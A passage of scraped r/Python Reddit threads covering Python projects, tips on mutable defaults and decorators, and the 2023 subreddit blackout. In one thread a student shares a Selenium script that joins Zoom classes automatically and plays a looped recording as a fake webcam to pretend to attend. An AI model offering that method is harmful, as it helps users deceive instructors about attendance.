            "content": "Easiest observable to know how popular async is by looking at the download rates of libraries that have a sync implementation and a separate async implementation. For example: https://pypistats.org/packages/mongo https://pypistats.org/packages/motor According to this Mongo (sync) had almost 24k downloads and motor (async) had almost 2 million downloads last month. That is enough of a difference for me to objectively say async won and is now industry standard. Of course, I would want to do that same analysis across several packages across different parts of the application.",
            "replies": [
                {
                    "author": "Toph_is_bad_ass",
                    "score": "16",
                    "content": "You got this twisted -- PyMongo is the sync mongo driver, not mongo. It has 28 million a month. This wouldn't have made sense of the face of it because PyMongo is a dependency of Motor since Motor is essentially PyMongo wrapped in a thread pool executor."
                },
                {
                    "author": "Drevicar",
                    "score": "10",
                    "content": "Someone else mentioned async boto3 (AWS stuff), and it is actually the opposite: https://pypistats.org/packages/boto3 https://pypistats.org/packages/aioboto3 Where boto3 (sync) had 1.25 *BILLION* downloads and aioboto3 (async) 2.3 million downloads last month. That is a huge difference in the other direction. So your milage may vary."
                }
            ]
        }
    ]
},
{
    "post_author": "marko_knoebl",
    "post_id": "jii8ex",
    "post_score": "2971",
    "post_time": "Monday, October 26, 2020 at 7:55:24 PM GMT+3",
    "flair_text": "Resource",
    "post_title": "I teach Python courses - here's my collection of about 1,000 slides on various Python topics, including data science (hosted on GitHub, licensed under CC-BY-SA)",
    "media": [
        "https://marko-knoebl.github.io/slides/#python"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "[deleted]",
            "score": "202",
            "content": "Thanks for the nice words! I'm really happy to hear this.",
            "replies": [
                {
                    "author": "marko_knoebl",
                    "score": "81",
                    "content": "Thanks for the nice words! I'm really happy to hear this."
                }
            ]
        },
        {
            "author": "marko_knoebl",
            "score": "100",
            "content": "Thanks a lot everyone, especially for the nice words! You're all actually boosting my motivation, so I'm going to spend this evening doing some more cleanup work / content extension :)",
            "replies": [
                {
                    "author": "[deleted]",
                    "score": "9",
                    "content": "Yes, you sharing knowledge so liberally is why the world improves. Thank you."
                },
                {
                    "author": "mrobviousreasons",
                    "score": "4",
                    "content": "You have done something amazing. I am in the midst of looking for a job and this might just help me."
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "33",
            "content": "Dude, you got me swooning, you're the type of man I'm looking for. In possession of resources AND generous enough to share freely?? Vielen Lieben Dank, ist ein Lifesaver der wie gerufen kommt!!"
        },
        {
            "author": "samii1031",
            "score": "12",
            "content": "This is AWESOME!!!! Thank you so much. Really good easily digestible sections!!! Bravo!!!!"
        }
    ]
},
{
    "post_author": "knowsuchagency",
    "post_id": "1dhii88",
    "post_score": "5",
    "post_time": "Monday, June 17, 2024 at 1:00:34 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Showcase: pdf-to-podcast.com -- Convert PDF's to podcast episodes. Free and open-source :)\n",
    "media": [
        "https://github.com/knowsuchagency/pdf-to-podcast",
        "https://pdf-to-podcast.com/"
    ],
    "post_content": "What My Project Does\nUpload any PDF and have it converted into a podcast episode with two or more speakers discussing its contents.\nhttps://github.com/knowsuchagency/pdf-to-podcast\nTarget Audience\nAnyone, but other developers in-particular. The code is open-source on GitHub and there's a link to the source on https://pdf-to-podcast.com. I want the project to serve as an illustrative example of how to build useful things on top of LLMs with relatively little code.\nComparison\nI just made this for fun. It's possible there are other similar projects",
    "comments": [
        {
            "author": "anthony2261",
            "score": "1",
            "content": "Nice! I love that the code is very simple yet powerful. Any future plans for the project?"
        }
    ]
},
{
    "post_author": "mountwebs",
    "post_id": "gf4boc",
    "post_score": "2578",
    "post_time": "Thursday, May 7, 2020 at 1:50:34 PM GMT+3",
    "flair_text": "",
    "post_title": "I created my first app, \"Timeglass\", a simple, unobtrusive menu bar timer for macOS.",
    "media": [
        "https://preview.redd.it/nge5pe54pbx41.png?auto=webp&s=a9fb6e3bad2ea713839b66e609812aeffce2357e",
        "https://i.redd.it/nge5pe54pbx41.png"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "mountwebs",
            "score": "160",
            "content": "I was searching for a simple menu bar timer for my mac. There are a lot of options, but I couldn't find what I wanted. I am very easily distracted when I study - even seeing the exact time left until my break can distract me. Instead I wanted an approximate visual representation of how much time is left. Because I couldn't find what I was searching for, I made a simple app. I am also learning python, so this was a nice exercise. The code is messy, but it works (i hope!). Feedback is more than welcome. https://github.com/mountwebs/timeglass Edit: Now with support for dark mode (suggested by u/VirtualCamel). Edit2: Now with notification and sound alert.",
            "replies": [
                {
                    "author": "80pilot",
                    "score": "52",
                    "content": "why can’t siri on mac do a timer i will be using this until the end of time thank you so much",
                    "replies": [
                        {
                            "author": "[deleted]",
                            "score": "11",
                            "content": "Until the end of TIMEGLASS!! Zing!"
                        }
                    ]
                },
                {
                    "author": "kaihatsusha",
                    "score": "22",
                    "content": "Years ago I did a Windows tool like this called \"InnaMinute.\" I suggest you put a few presets in the menu: 1 minute, 5 minutes, 15 minutes, 1 hour. The most common button just like a microwave is \"add 1 minute\" which can be done by command-clicking or middle-clicking the icon itself.",
                    "replies": [
                        {
                            "author": "mountwebs",
                            "score": "13",
                            "content": ""
                        }
                    ]
                },
                {
                    "author": "backdoorman9",
                    "score": "9",
                    "content": "",
                    "replies": [
                        {
                            "author": "mountwebs",
                            "score": "14",
                            "content": ""
                        }
                    ]
                },
                {
                    "author": "G33K_FISH",
                    "score": "2",
                    "content": ""
                },
                {
                    "author": "rflappo",
                    "score": "2",
                    "content": ""
                },
                {
                    "author": "a__b",
                    "score": "1",
                    "content": "",
                    "replies": [
                        {
                            "author": "mountwebs",
                            "score": "1",
                            "content": ""
                        }
                    ]
                }
            ]
        },
        {
            "author": "VirtualCamel",
            "score": "99",
            "content": ""
        },
        {
            "author": "thetorque1985",
            "score": "18",
            "content": "what an inspiration ! It's clean and beautiful."
        },
        {
            "author": "pushfoo",
            "score": "14",
            "content": "This is good! The only visual improvements I can suggest are adding icons to the left of Pause, Reset, and Set Time. u/VirtualCamel already suggested theme compatibility improvements. I already filed an issue for adding a license to it. If that gets sorted, i'd love to use this for pomodoro. Are you open to people filing additional issues?"
        },
        {
            "author": "RjakActual",
            "score": "8",
            "content": "I desperately want a timer that I can set to a clock time but gives me a countdown. Like it’s 9am, I want to say “countdown to 1pm” and the timer starts the countdown 03:59:59. Surprisingly difficult to find a timer app that’ll do this."
        },
        {
            "author": "okasiyas",
            "score": "18",
            "content": "r/madeinpython"
        },
        {
            "author": "[deleted]",
            "score": "4",
            "content": "This is cool, I will be checking out the code. Does the hourglass begin to empty as the time decreases?"
        },
        {
            "author": "appsplaah",
            "score": "4",
            "content": "AWESOME! Try Integrating Pomodoro techique with it :p Do you mind telling what did you use to make it??"
        },
        {
            "author": "UKD28",
            "score": "4",
            "content": "Can I use it on Ubuntu"
        }
    ]
},
{
    "post_author": "justinezila",
    "post_id": "1d9upsj",
    "post_score": "42",
    "post_time": "Friday, June 7, 2024 at 1:12:16 AM GMT+3",
    "flair_text": "Resource",
    "post_title": "I created a video on why you should be careful when using Python dictionaries as function parameter",
    "media": [
        "https://www.youtube.com/watch?v=zTTDQePffxU"
    ],
    "post_content": "This talks about mutability as Changes inside a function affect the original dictionary which could lead to unexpected behaviors and hard to debug issues.\nHere is a link to the video\nhttps://www.youtube.com/watch?v=zTTDQePffxU",
    "comments": [
        {
            "author": "yrubooingmeimryte",
            "score": "55",
            "content": "It’s a pretty well known foot gun that you shouldn’t use any mutable object as a default input. Also, I don’t think I’ve ever seen anybody use a default dictionary in this way. Even ignoring the undesired behaviour, this is such a strange way of trying to have a function handle optional inputs and defaults.",
            "replies": [
                {
                    "author": "No_Lingonberry1201",
                    "score": "7",
                    "content": "What, you don't use mutable defaults to store global state while being able to claim (falsely) that you don't use non-constant globals? /s obviously"
                },
                {
                    "author": "svefnugr",
                    "score": "12",
                    "content": "The real footgun is mutating an input, regardless of whether it has a default or not. The fact that the default value is the same for all calls to the method is absolutely unsurprising and directly follows from the way Python handles function definitions.",
                    "replies": [
                        {
                            "author": "yelircaasi",
                            "score": "2",
                            "content": "The real footgun is not using Haskell /s"
                        },
                        {
                            "author": "commy2",
                            "score": "1",
                            "content": "A good example are classes that take dictionaries as attributes: class C: def __init__(self, d={}): self.d = d.copy() Absolutely nothing wrong with the dict default argument here, while the common if d is not None: idiom means the object could be modified by action at a distance.",
                            "replies": [
                                {
                                    "author": "TheSpaceCoffee",
                                    "score": "2",
                                    "content": "I’m a partisan of having the default value set to None, and using d = d or {} Defaults to an empty dictionary if None, but less verbose than the if d is not None fashion."
                                }
                            ]
                        }
                    ]
                },
                {
                    "author": "mgedmin",
                    "score": "5",
                    "content": "I have used def mything(..., _cache={}): intentionally in the past, expecting the changes to be preserved between function calls. I've stopped."
                }
            ]
        },
        {
            "author": "nilsph",
            "score": "81",
            "content": "Any mutable type, really. Sets, lists, custom classes, …"
        },
        {
            "author": "Muhznit",
            "score": "32",
            "content": "*As a default parameter in a function, i.e. don't do this: def func(some_dict_parameter={}): I'll let the video explain it, but this is to summarize what not to do."
        },
        {
            "author": "Glathull",
            "score": "25",
            "content": "Dictionaries are fine as params. Never use any mutable type as a default param."
        },
        {
            "author": "vantasmer",
            "score": "4",
            "content": "What should be used instead of a default dict?",
            "replies": [
                {
                    "author": "danted002",
                    "score": "19",
                    "content": "You set the parameter as None and then in the body of the function you do x = x or {}"
                }
            ]
        },
        {
            "author": "m15otw",
            "score": "4",
            "content": "As parameter defaults, yes. Use None as a sentinel and check for it, initialize with a new mutable instance in the function body, so it will run every time."
        }
    ]
},
{
    "post_author": "ashok_tankala",
    "post_id": "1dcfzo8",
    "post_score": "0",
    "post_time": "Monday, June 10, 2024 at 10:41:11 AM GMT+3",
    "flair_text": "",
    "post_title": "Understanding Python Decorators",
    "media": [
        "https://newsletter.piptrends.com/p/understanding-python-decorators"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "JamzTyson",
            "score": "81",
            "content": "Without using decorators I think mostly we can’t build a decent application. I wish people would avoid making such silly, sweeping claims. If you have something interesting to say, there is no need to hype it to the absurd.",
            "replies": [
                {
                    "author": "PossibilityTasty",
                    "score": "7",
                    "content": "I made (arguably) decent applications before there were decorators."
                },
                {
                    "author": "Zeikos",
                    "score": "5",
                    "content": "Did you know they nonody ever coded in other languages before python invented decorators?? It reminds me when I was a kid and the new toy was the one I'd use forever and ever. It usually lasted a week.",
                    "replies": [
                        {
                            "author": "yrubooingmeimryte",
                            "score": "1",
                            "content": "To be clear, the decorator pattern isn’t a Python invention."
                        },
                        {
                            "author": "ashok_tankala",
                            "score": "0",
                            "content": "I am not sure if Python invented them or not. In Java annotations which are similar to decorators have been there for a long time.",
                            "replies": [
                                {
                                    "author": "wjrasmussen",
                                    "score": "-2",
                                    "content": "You should be ashamed of your post."
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "PossibilityTasty",
            "score": "71",
            "content": "A Python decorator is a function that takes in a function and returns it by adding some functionality. This is wrong, four times. A decorator does not need to be a function, but a Callable. A decorator does not need to take a function, it can take a class as well. A decorator does not need to return the function that it decorates, it can return any object including None. A decorator does not need to add any functionality.",
            "replies": [
                {
                    "author": "siowy",
                    "score": "14",
                    "content": "In 98% of cases, I would say he's right."
                },
                {
                    "author": "sabiondo",
                    "score": "1",
                    "content": ""
                }
            ]
        },
        {
            "author": "PaulRudin",
            "score": "13",
            "content": "The decorator syntax is really just a little bit of syntactic sugar - we could manage fine without it - we'd just have to type a few more characters..."
        },
        {
            "author": "undead-dnb",
            "score": "4",
            "content": "You have misspell; should be exiting not existing 😉"
        },
        {
            "author": "pythosynthesis",
            "score": "2",
            "content": "Remember that decorators are just syntactic sugar. In other words, at the cost of more code, possibly less readable, you can do absolutely the exact same thing without using decorators."
        },
        {
            "author": "TheRNGuy",
            "score": "1",
            "content": "I only used dataclass."
        }
    ]
},
{
    "post_author": "pmz",
    "post_id": "nf4jh0",
    "post_score": "2555",
    "post_time": "Tuesday, May 18, 2021 at 10:47:45 AM GMT+3",
    "flair_text": "Resource",
    "post_title": "Embedded Python: Build a Game on the BBC micro:bit – Real Python",
    "media": [
        "https://external-preview.redd.it/8pz3n07kZW3EtkakHlDJNXkse85o2oVXAfQ5jPlYcCo.jpg?width=640&crop=smart&auto=webp&s=eb5a749a972a25104c3469674a3cca7dd548413e",
        "https://realpython.com/embedded-python/"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "pbaum",
            "score": "93",
            "content": "The thing missing from this is any mention of the Mu Editor. It's an IDE specifically for MicroPython/CircuitPython boards that automates the flash process so you don't need to teach middle schoolers how to wrestle with downloading the hex file, opening your file explorer, finding the file, copying it to the board etc. Mu makes it painless. I have no affiliation with it, just a teacher who depends on it everyday. Basically anyone who teaches Python with Microbits uses it so the fact the author didn't mention it is a serious omission. https://codewith.mu/"
        },
        {
            "author": "Reacher-Said-N0thing",
            "score": "33",
            "content": "The BBC micro:bit is an embedded system designed for educational use. On board a micro:bit, there are lots of components, including buttons, a 5x5 LED screen, a speaker and microphone, an accelerometer, and a Bluetooth module. Unfortunately, the Bluetooth module is unusable with Python, :/ Sure let's pick the one language that makes basic features of our hardware stop working."
        },
        {
            "author": "KonyHawksProSlaver",
            "score": "-4",
            "content": "made for BBC"
        }
    ]
},
{
    "post_author": "Palani-SN",
    "post_id": "1dahhdx",
    "post_score": "0",
    "post_time": "Friday, June 7, 2024 at 9:08:11 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "py4cli (A python library for developing scalable cli utility tools using declarative programming)",
    "media": [
        "https://github.com/Palani-SN/py4cli",
        "https://github.com/Palani-SN/py4cli/blob/main/README.md",
        "https://pypi.org/project/py4cli/",
        "https://github.com/Palani-SN/py4cli/tree/main/EXAMPLES"
    ],
    "post_content": "py4cli (Scalable Argument Parser)\nTarget Audience\n* Developers who want to develop scalable cli utility tools in python using declarative programming\nComparison \n* Even Though Python have great libraries for passing command line arguments, those libraries aren't scalable for complex use case. So, I have developed a scalable argument parser, which not only helps in passing cli arguments, but also can alter the execution flow of the code based on arguments.\n* The Library have two variants minimal and moderate argument parsers, minimal can be used for creating simple cli tool, while moderate is vertically scaled version of minimal argument parser & helps in controlling execution flow of the tool in addition to routing the arguments to the respective methods.\nWhat My Project Does\n* The library works fine with windows & Linux supporting basic data types like int, float, str, list, dict, bool. Further developments for making the solution even more scalable is in progress.\nKindly check out the project and documentation below,\nGitHub Link : https://github.com/Palani-SN/py4cli ,\n* Kindly rate the project in GitHub with stars if you like\nPYPI Link : https://pypi.org/project/py4cli/\n* Feel free to try this out with installation and usage.\nI am still actively developing it, so any feedback/comments would be appreciated!\nEDIT :\nHow is it different than already existing tools :\nargparse - argparse is good in supporting different data types, but might not be able to control the flow of the code, or the arguments passed in can not be hierarchical always, which is what I term as scalability. In py4cli, the motive is to have better scalability in terms of hierarchical argument parsing.\nclick, typer & cyclopts - Even though they support hierarchical cli arguments parsing, I feel, they rely much on decorators and its arguments more than necessary, In py4cli, the motive is to have, no extra decorators, or annotations as code, all that needs to be done is define a derived class from one of the base class provided in the lib, as per need and you can directly pass arguments to different methods of the class like how you will pass args and kwargs to a function natively.\nPy4Cli will be fulfilling the very basic aspects of cli interface to parse arguments, while ignoring on cli sophistication to concentrate on the scalability of the arguments passed, and in future to pass nested configuration files as inputs, with an emphasis on loosely coupled architecture.\nAdditional Resources :\ndocs : https://github.com/Palani-SN/py4cli/blob/main/README.md\nexamples : https://github.com/Palani-SN/py4cli/tree/main/EXAMPLES",
    "comments": [
        {
            "author": "MaticPecovnik",
            "score": "24",
            "content": "What does it mean for a CLI to be scalable?",
            "replies": [
                {
                    "author": "zdog234",
                    "score": "3",
                    "content": "It feels like \"scale\" applies to kubectl, but I can't explain why EDIT: really good completion?",
                    "replies": [
                        {
                            "author": "Palani-SN",
                            "score": "3",
                            "content": "scalability indicates the support for hierarchical arguments to be passed in, via command prompt to certain extent and in future as nested config files.",
                            "replies": [
                                {
                                    "author": "MaticPecovnik",
                                    "score": "7",
                                    "content": "To me scalability and CLI dont go together as CLI is by definition local to that single terminal you ran it from. But I guess the term has different conotations depending on the one who uses it"
                                }
                            ]
                        }
                    ]
                },
                {
                    "author": "broknbottle",
                    "score": "3",
                    "content": "It’s like MongoDB, you just turn it on and it scales right up"
                }
            ]
        },
        {
            "author": "an_actual_human",
            "score": "19",
            "content": "Why would one choose it over, say typer?",
            "replies": [
                {
                    "author": "ArgetDota",
                    "score": "6",
                    "content": "Cyclopts is the new Typer"
                },
                {
                    "author": "pan0ramic",
                    "score": "6",
                    "content": "Or click. I appreciate the effort but I feel like this problem has already been solved"
                }
            ]
        },
        {
            "author": "thicket",
            "score": "8",
            "content": "I'm always curious about better or smoother alternatives to `argparse`, but it's not at all clear to me how this is an improvement. I guess you're defining a CLI with a set of dictionaries with an implicit schema somehow? What were you setting out to do, and how is this better than other options?",
            "replies": [
                {
                    "author": "028XF3193",
                    "score": "2",
                    "content": "Same. I used to always default to click, but after using argparse more heavily I don't know why I ever bothered with click."
                },
                {
                    "author": "Palani-SN",
                    "score": "2",
                    "content": "The example illustrated in the docs, uses template function with all the argument type supported, the function can be customized based on our own need, like name, arguments, docstrings, return type and those will be used instead, for routing cli args to the respective functions and the order/sequence of execution will also be preserved."
                }
            ]
        },
        {
            "author": "i_can_haz_data",
            "score": "2",
            "content": "I’m partial to argparse above all the new and interesting ideas for CLI entry-points. We’ve built CmdKit (cmdkit.readthedocs.io) on top of argparse to just take care of the boilerplate and patch some of the behavior."
        }
    ]
},
{
    "post_author": "diegoortiz2000",
    "post_id": "fna798",
    "post_score": "2946",
    "post_time": "Monday, March 23, 2020 at 3:07:20 AM GMT+3",
    "flair_text": "I Made This",
    "post_title": "Because of quarantine and online clases I made some scripts to automatically connect to my zoom classes to get more sleep, I also configured my Mac to show old recording of me as a virtual cam in zoom so I don't have to attend early classes",
    "media": [
        "https://i.redd.it/inog500edbo41.png",
        "https://preview.redd.it/inog500edbo41.png?width=640&crop=smart&auto=webp&s=25621926dd1b97f84e4c9a1df9c7023c1f33bba9"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "dougie-io",
            "score": "475",
            "content": "By the time quarantine is up, you'll have developed a robot to take classes for you so you'll never have to go again! Do they actually make students turn on their webcam or could you join audio only?",
            "replies": [
                {
                    "author": "diegoortiz2000",
                    "score": "240",
                    "content": "Hahaha probably, yeah they make you turn on your camera and mic, although they are gonna make us mute other wise it will be a circus. Sorry for my rant but it’s ridiculous considering I’m in college and starting with my generation attendances wasn’t required."
                }
            ]
        },
        {
            "author": "ladylazarus888",
            "score": "126",
            "content": "You're a very smart hamster. Now you only need to use AI to do the transcribing/note taking for you.",
            "replies": [
                {
                    "author": "diegoortiz2000",
                    "score": "58",
                    "content": "That would be amazing, although there’s not much accurate speech to text AI in Spanish, but classes can be recorded so that’s a plus"
                }
            ]
        },
        {
            "author": "diegoortiz2000",
            "score": "100",
            "content": "This is for Mac. I created a python script with selenium that automatically connects to my class, I made a script for each class, then with automator I made those scripts apps and finally I used the calendar app included in macOS to start each script when that class starts. Teachers asked for camera to be on so I used an app called webcamoid to play a recording of me in loop and fake it as a virtual cam. So I configured my mc to start automatically at 6:50 am, to start webcamoid and then schedule does the rest for me. So all I need to do is to let my Mac on and I could be sleeping all day. If you need more details because you plan this hit me up and I can make a more detailed guide, here the code of each script for now import time from appscript import app from selenium import webdriver from selenium.webdriver.chrome.options import Options exec_path_driver = 'path/to/chromedriver' ch_options = Options() # Chrome Options ch_options.add_argument('user-data-dir=/Users/\"username\"/Documents/Chrome profile selenium') # Profile browser = webdriver.Chrome(options=ch_options) browser.get('https://zoom.us/\"classcode\"') time.sleep(2) browser.close() time.sleep(7) app('System Events').keystroke('\\r')"
        }
    ]
},
{
    "post_author": "prateekvellala",
    "post_id": "1db05gm",
    "post_score": "86",
    "post_time": "Saturday, June 8, 2024 at 1:46:20 PM GMT+3",
    "flair_text": "",
    "post_title": "Archand: Control your mouse entirely using hand gestures.",
    "media": [
        "https://github.com/prateekvellala/Archand"
    ],
    "post_content": "Single left click\nSingle right click\nDouble left click\nHold left click and move pointer (for dragging, etc)\nScroll up\nScroll down\nEnable your microphone, and then whatever you say will be converted to text and typed where your cursor is blinking (automating keyboard functionality)\nTarget Audience\nEveryone\nComparison\nThere is no comparison with any other projects, as I have not seen any that incorporate all the features I have implemented, which work accurately with both low-resolution integrated laptop webcams and high-end webcams. All the projects I've encountered with a similar concept mainly fall into three categories:\nThey don't work at all, failing even to move the cursor smoothly.\nThe cursor moves pretty well and smoothly, but they do not fully automate the mouse, as they always lack some other feature like double-clicking, right-clicking, or scrolling, etc.\nThey have many features that work well, but require high-end webcams, such as the Logitech Brio.",
    "comments": [
        {
            "author": "mr_claw",
            "score": "103",
            "content": "Bruh. I already control my mouse using entirely hand gestures.",
            "replies": [
                {
                    "author": "dAnjou",
                    "score": "12",
                    "content": "Technically correct, the best kind of correct!"
                },
                {
                    "author": "[deleted]",
                    "score": "",
                    "content": "Yeah I just place my hand on the mouse and move it.",
                    "replies": [
                        {
                            "author": "mr_claw",
                            "score": "10",
                            "content": "Yeah I just place my hand on the mouse and move it."
                        }
                    ]
                }
            ]
        },
        {
            "author": "vb-Automation",
            "score": "10",
            "content": "Can you imagine the command center you could build and no keyboard (voice) now no touch of the mouse either. You are now moving the files on you 80inch TV with your hands pretty cool dude possibilities are huge. What limitations have you ran into?",
            "replies": [
                {
                    "author": "prateekvellala",
                    "score": "11",
                    "content": "A big one is that, If you're too close to the camera, it becomes difficult to reach the corners or edges of the screen, which can make tasks like closing apps or using the taskbar problematic. So, it would require maintaining a good amount of distance from your laptop for it to work well, which may not always be possible or preferable. However, using an external webcam is an easy fix for this issue."
                }
            ]
        },
        {
            "author": "ancientweasel",
            "score": "3",
            "content": "Cool, tha ks for sharing. Why is your recommend python version the oldest supported one?",
            "replies": [
                {
                    "author": "prateekvellala",
                    "score": "4",
                    "content": "The autopy library can only be installed on Python 3.8 or earlier versions. I just found 3.8.10 to work the best."
                }
            ]
        },
        {
            "author": "lostinfury",
            "score": "3",
            "content": "Pretty cool project. It reminds me of a drawing app I built for a school project. It was written in Java, and made use of the Xbox kinect. Different gestures allowed you to select different drawing modes and styles. Also, it wasn't limited to the XY coordinates, but can also detect how far away one is from the camera thanks to the depth sensors of the kinect; This made for a wider selection of gestures and drawing styles."
        },
        {
            "author": "Collegesniffer",
            "score": "2",
            "content": "Wow! This is amazing! Tried it both on my logitech brio and laptop."
        },
        {
            "author": "Suitable_Ad4685",
            "score": "2",
            "content": "Turning on the mic is actually funny"
        },
        {
            "author": "yrubooingmeimryte",
            "score": "2",
            "content": "How else are people controlling their mouse? Foot gestures?"
        }
    ]
},
{
    "post_author": "Trinity_software",
    "post_id": "1da5fpo",
    "post_score": "2",
    "post_time": "Friday, June 7, 2024 at 11:06:38 AM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "Password protect Pdf using python ",
    "media": [
        "https://youtu.be/sSPWHRpDZXo?si=b-HJ4Cu1sN-tFls1"
    ],
    "post_content": "https://youtu.be/sSPWHRpDZXo?si=b-HJ4Cu1sN-tFls1 This video explains how files ( all types) are encrypted and decrypted with PyAesCrypt module of python. Also using pypdf module , pdf files are password protected. Decryption of password protected pdf can also be done",
    "comments": []
},
{
    "post_author": "knowsuchagency",
    "post_id": "1dhii88",
    "post_score": "5",
    "post_time": "Monday, June 17, 2024 at 1:00:34 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Showcase: pdf-to-podcast.com -- Convert PDF's to podcast episodes. Free and open-source :)\n",
    "media": [
        "https://github.com/knowsuchagency/pdf-to-podcast",
        "https://pdf-to-podcast.com/"
    ],
    "post_content": "What My Project Does\nUpload any PDF and have it converted into a podcast episode with two or more speakers discussing its contents.\nhttps://github.com/knowsuchagency/pdf-to-podcast\nTarget Audience\nAnyone, but other developers in-particular. The code is open-source on GitHub and there's a link to the source on https://pdf-to-podcast.com. I want the project to serve as an illustrative example of how to build useful things on top of LLMs with relatively little code.\nComparison\nI just made this for fun. It's possible there are other similar projects",
    "comments": [
        {
            "author": "anthony2261",
            "score": "1",
            "content": "Nice! I love that the code is very simple yet powerful. Any future plans for the project?"
        }
    ]
},
{
    "post_author": "iiron3223",
    "post_id": "1424s7m",
    "post_score": "2547",
    "post_time": "Tuesday, June 6, 2023 at 8:21:42 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Going dark on 12th June",
    "media": [
        "https://www.reddit.com/r/Python/",
        "https://www.reddit.com/r/Save3rdPartyApps/comments/13yh0jf/dont_let_reddit_kill_3rd_party_apps/"
    ],
    "post_content": "I wanted to ask you if r/Python is planning to join the protest against Reddit's new policy. Many subreddits decided to support that initiative. I know it is not directly related to Python, but it is relevant to our community\nwhat's going on?",
    "comments": [
        {
            "author": "IAmKindOfCreative",
            "score": "1",
            "content": "We've seen this and I've been working on a full post about it for the last couple of days (though the bulk of it was something I was holding off on until after the admin reply which was posted late yesterday) The quick version of what the post to come: I want to, however it is not my decisions, it's the communities decision. I cannot go private without your support. Given this post, votes, and comments, and given that I was not the one to prompt it, I think it's probably something the community supports but I want to be sure. The post will cover a background on what this is, a summary of how the changes can impact the mods and the users, a review of the admin response and the good will (or lack thereof) in it, and a summary of what the blackout could mean for our community. Edit: It took forever to write the whole doc. Here is my post asking if we should participate"
        },
        {
            "author": "[deleted]",
            "score": "611",
            "content": "Should be indefinite until they reverse",
            "replies": [
                {
                    "author": "akshayk904",
                    "score": "113",
                    "content": "This is the way to go. 2 days they wont budge.",
                    "replies": [
                        {
                            "author": "[deleted]",
                            "score": "",
                            "content": "The problem is that 2 weeks later, the change is going into effect if I understand correctly. There won't be time for another show of force.",
                            "replies": [
                                {
                                    "author": "Moleculor",
                                    "score": "13",
                                    "content": "The problem is that 2 weeks later, the change is going into effect if I understand correctly. There won't be time for another show of force."
                                }
                            ]
                        },
                        {
                            "author": "philoponeria",
                            "score": "2",
                            "content": "The mods who have control over multiple subs don't want to risk being removed entirely and replaced with more compliant 'volunteers'"
                        },
                        {
                            "author": "_by_me",
                            "score": "-1",
                            "content": "at best someone will make an alternative to the sub that close down, and the original subs will slowly die, and at worst the rogue mods will just be kicked out by the admins"
                        }
                    ]
                }
            ]
        },
        {
            "author": "stumptowncampground",
            "score": "300",
            "content": "Reddit is directly attacking the development community. My feeling is that all communities, especially dev-related ones, should shut down indefinitely.",
            "replies": [
                {
                    "author": "akshayk904",
                    "score": "60",
                    "content": "They are attacking the entire ecosystem. Devs and mods both will be heavily affected."
                }
            ]
        },
        {
            "author": "IDENTITETEN",
            "score": "158",
            "content": "For anyone who feels compelled to write something along the lines of \"It's their right and blahbla costs\": Yes it is, but the timeframe and the amount of cash that they want when sites like Imgur wants far less makes it pretty obvious that they're just doing this to get rid of all 3rd party apps. Not to mention how they've treated the 3rd party devs, amongst other things they called the Apollo app \"inefficient\" with its API calls without really backing it up with anything more than irrelevant metrics.",
            "replies": [
                {
                    "author": "KingsmanVince",
                    "score": "66",
                    "content": "Reddit is like a baby throwing tantrum after people make better apps with great UI/UX. Reddit development plan is weird. They add NFT and crypto stuff but they can't fix videos."
                }
            ]
        },
        {
            "author": "n3cr0ph4g1st",
            "score": "13",
            "content": "Do it indefinitely"
        }
    ]
},
{
    "post_author": "Phantom569",
    "post_id": "f7taiy",
    "post_score": "2924",
    "post_time": "Saturday, February 22, 2020 at 5:35:57 PM GMT+3",
    "flair_text": "I Made This",
    "post_title": "My python image/GIF glitching library is now on pypi!",
    "media": [
        "https://preview.redd.it/os82omztkhi41.gif?width=640&crop=smart&format=png8&s=c4e44d265576b6a4a07b8e98a643d0ab32a4999d"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "eyesoftheworld4",
            "score": "173",
            "content": "Very cool! Instead of requiring users to choose to download a separate file to use the CLI or install through PyPI, you should add an entry_point to your setup.py. This will make it so that when they install your package from PyPI it will automatically include a command line callable (like glitch_this) which they can invoke directly. Then users get both the library and CLI at once. More info on how to do that can be found here.",
            "replies": [
                {
                    "author": "jack-of-some",
                    "score": "20",
                    "content": "What's the difference between entry points and scripts? I almost always do a script for something like that.",
                    "replies": [
                        {
                            "author": "eyesoftheworld4",
                            "score": "23",
                            "content": "The concept is similar, in fact as far as I understand it, it's identical to calling the code like python my_script.py <arguments>, but you can do it directly from the command-line using whatever alias the package creator specified. It's particularly advantageous in a case like this where OP wrote a library and then created a CLI to expose the features of that library conveniently to users. Using an entrypoint in setup.py will tell Python that this package contains that bit of code which is meant to be called from the command line, and Python will automatically do the following when it installs it: create an executable binary for the code add it to the system path so it is accessible from any terminal session This means that when the user installs the package using the setup.py file, they will be able to use the components defined within in Python directly, and will also be able to call the bit exposed to the command line by whatever name you define. The user gets both for free, and also doesn't need to remember where they put the file in order to invoke it. If you're writing a couple of scripts just for you to use, then it might not be worthwhile to do this, but if you're creating a suite of scripts which all work together, and you want to be able to install, uninstall, easily version and update, and especially distribute them, then you should strongly consider using a setup.py file and an entrypoint.",
                            "replies": [
                                {
                                    "author": "jack-of-some",
                                    "score": "3",
                                    "content": "No I meant using the scripts directive in setup.py where you can point to a bunch of files in your package that should be considered executables and get installed on the same path as the package. So you can call it from the commandline anywhere, same as what you're describing. That would require one file per command (but that file can also be a bash script or anything really)"
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "Phantom569",
            "score": "89",
            "content": "Check out the source here! Get the package on pypi, just use pip3 install glitch-this!"
        },
        {
            "author": "dspec12",
            "score": "25",
            "content": "Glitchin!"
        },
        {
            "author": "g-money-cheats",
            "score": "49",
            "content": "This is awesome. It reminds me of Into the Spider-Verse."
        }
    ]
},
{
    "post_author": "marcogorelli",
    "post_id": "1decdu5",
    "post_score": "200",
    "post_time": "Wednesday, June 12, 2024 at 8:31:34 PM GMT+3",
    "flair_text": "News",
